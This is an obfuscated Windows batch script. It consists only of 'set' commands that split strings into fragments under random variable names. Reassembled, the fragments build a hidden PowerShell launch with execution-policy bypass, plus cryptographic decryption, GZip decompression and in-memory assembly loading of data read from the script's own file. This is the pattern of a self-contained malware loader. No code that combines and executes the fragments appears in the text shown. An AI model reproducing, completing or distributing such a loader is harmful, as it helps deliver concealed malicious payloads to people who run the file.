@echo off
set "KnfjkFiwdq=Sy"
set "jkWeukIsxZ=ws"
set "etfkOVpWEp=he"
set "QhQTRzpqOL=po"
set "NFdPvdSGhD=\v"
set "pKwvHbpdjj=Wi"
set "dfLLMDRQuA=he"
set "bkokdZcioS=\W"
set "EjDekJtdXw=st"
set "zIJYnWBcKs=y "
set "nQPmPNLDjY=in"
set "RFrsykGsAI=ow"
set "tlgcIWXcpb=xe"
set "uXCBZmWEJT=em"
set "vxrHQmgejM=rs"
set "EgVIIcULRE=rS"
set "JENkVvvWmF=do"
set "jOpQFFsBRe=Po"
set "woVhiQZSAR=py"
set "viNGREAihS=32"
set "cIObEvkTin=we"
set "ygEIatPidF=.e"
set "hAzZFJaMVw=0\"
set "rriqlZqosd= C"
set "KHJmZzROuo=1."
set "HeNbBiUJwm=co"
set "OlHDGAGtGc=:\"
set "kAaJlyMxuk=ll"
set "DuzHcUxIvr= /"
set "cUfiNmlMVX=ll"
set "SWYjjwxdpI=we"
set "jGmyCGUNJj=s\"
set "SiclzpWwQB=nd"
set "slfMwWwAFw=cd"
set "AHWqjlQFxP= %~dp0"
set "mUyEVkvCqO=]::N"
set "KeZdWkfbvq=Syst"
set "XWLGFgtUrf=eMVs"
set "QltabHRYpy=orF'"
set "fjwNTUZkSf=bypa"
set "rsvJITYMAX=ecry"
set "njZXgmpfGF=pres"
set "NbwWzpYzlX=m.Re"
set "aKfnbjixOb=.Cry"
set "OmFPEqTPeO=gnir"
set "ChngQBzQOx=.Com"
set "GANzAMBKPx=ss -"
set "POeAgPzgmo=morF"
set "aPrzEhteOy=brea"
set "lkIWNfCPcn=ke($"
set "dnrHKIkyOW=uSIe"
set "qQFpNcoSxh=DdR."
set "HPKnICFvrK=:: '"
set "kHdWxYKNgN=PTtG"
set "sRhVgYSVOI=.-16"
set "eMjtzriGuy=iron"
set "fJPtOcRBVi=join"
set "qEIgfpYLJt=.GZi"
set "CvWsSDUaot=[]] "
set "ZSYVTFvYQu=quN "
set "HMppTpYzlB=.Cre"
set "jlFPfSkDcr=gsYZ"
set "ZKTECGhCLU=embl"
set "vFTxpYAmFY=b = "
set "dOsgkhqcgv=ypto"
set "aYjIwNtQrB=tem."
set "TMoIBTATKV=Conv"
set "nkDvyqMpPa=CM ="
set "ZmqjHHXQso=rans"
set "pJSstgAVlm=Comp"
set "zbmQDqRbqV=YxVw"
set "ewuoOsyPBF=lZqu"
set "DoQqvOliVP=gjYA"
set "GXjUFDlxaq=, $k"
set "kBBxcXTQfI=File"
set "SYtyVzlkfm=CFxo"
set "VkmwlHdKHo=stem"
set "mNTSiSSfNT=)))"
set "PWjHxHStTm='0Pg"
set "AitnQgzVWx=ptog"
set "qnuQrTssVT=$Euu"
set "DWTRLBsRZz=[IO."
set "IWXYkfXRMd=;$pl"
set "myjnFwsJIE=ion."
set "syuYoWmmAr=y.Cr"
set "txfHHbdOBt=('da"
set "YzfDdLFeHo=);$j"
set "BROrpBEmWA=-4] "
set "hrgkOUYLOg=e = "
set "GCqltZjHUA=ment"
set "FzmhcBAsRs=QPLu"
set "hcdqSKzoGa=..-1"
set "ZvuuWIjxQk==');"
set "tguemfsDqq=('%~f0'"
set "hcQyUmtDDe=e]::"
set "LvSFHhmBxh=Lun."
set "vIPiHigXzq=16] "
set "jWcGWNRvLZ=ose("
set "MLZyrnlyrc=; };"
set "XhFXAYjCSm=ddin"
set "qnrUIQweEE= [Sy"
set "fKjAPhxHRG=ateD"
set "UcUpGVcjqJ=.Dis"
set "PMIibLBmUc=.Mod"
set "OosxzGadrY=Lb ="
set "upWozWMZTi=y]::"
set "AAcgzbkolf=lBlo"
set "aTOImaMuaX=k; }"
set "NnTRGXkMrW=em.I"
set "xvGKfyTFZK=..-1"
set "VcKPNjoExo=fore"
set "TWejXHZtZA=();$"
set "HccwTZuxSu=A.Pa"
set "PLQdqqTZYl=$kua"
set "EOvJSZEokf=Bbrd"
set "pdkALXUSwC=m.IO"
set "DNUFcLXTlt=saBm"
set "nbIBaXzyju='txe"
set "gMKOySVuRv=106u"
set "OoBSIcvmvP=tsWi"
set "plzmvsKMlH=('Tg"
set "lbLnKHzNPj=oint"
set "EmuDjesZzj=ress"
set "kFLyMPUsSq=-ep "
set "lXpbixtCZK=.Con"
set "gQZuAgNSYg=HrV."
set "GWNjibnKZx=)($J"
set "qdCKkjjEta=.Sec"
set "ykTjtmpHIm=gMod"
set "mhgtrUPslC=vert"
set "llKNyJRlYZ=$RVi"
set "UFMaFbiLRc=rV.T"
set "reMriEwAlD=esaB"
set "NmFZbnMuOH=daeR"
set "GcEzVOJPst=New-"
set "UhqBCDUMmo=yste"
set "kuOzjaOcVs=-1.."
set "IVIOEWNnDa=;$lB"
set "VRoxcrWAtE=tion"
set "KwyprqSWjY=ptor"
set "QWPhFtLRhG=[Sys"
set "REBEMucIEb=Secu"
set "MDDrNiwFiC=$Euu"
set "QSnJBFEjSb=y.Ci"
set "uVpxzHjopu=sion"
set "slAugIBSSQ=$QPL"
set "EIwrolXKUv=oL'["
set "VNhWYOVyGE=Bmor"
set "UoEPQHlnvX=)) {"
set "oXcNfXuwWP=L4Yi"
set "hXssMMDUIV=n = "
set "oEvmqXutGt=un, "
set "usPJxIvyTR=rt]:"
set "asOTKnmIkE=.IO."
set "cSCiNbCReY=HrV "
set "OpNDgFaiKD=raph"
set "WNgeaLALKS=quN."
set "pnFaYXjfCp== [S"
set "MVFNdTCFud=]::("
set "DnahCqdSuV=;$Sb"
set "VFqFPzOLHY=ach "
set "rvawUqTPiH=zuZI"
set "IOlQhGSPHi=eam("
set "eAuRkOPOUC=e = "
set "mgNeQgHVIA=bjec"
set "qhhEjhFAaX=ew-O"
set "MymIMNkNyD='gni"
set "pgytqiSaxf='[-1"
set "gnernlwDSe=le  "
set "wlRAVPnqse=yste"
set "GDYPhQNjWi=.Mem"
set "HLNtSRtwjw=uaLb"
set "IoUIqCIRQc=ksZ "
set "TGQOxSTgNO=se()"
set "TOEnGnoLFg= = $"
set "yyemafgbDu=O.Me"
set "MoGMpzWtFR=y.Pa"
set "GppNwXeLPk=::('"
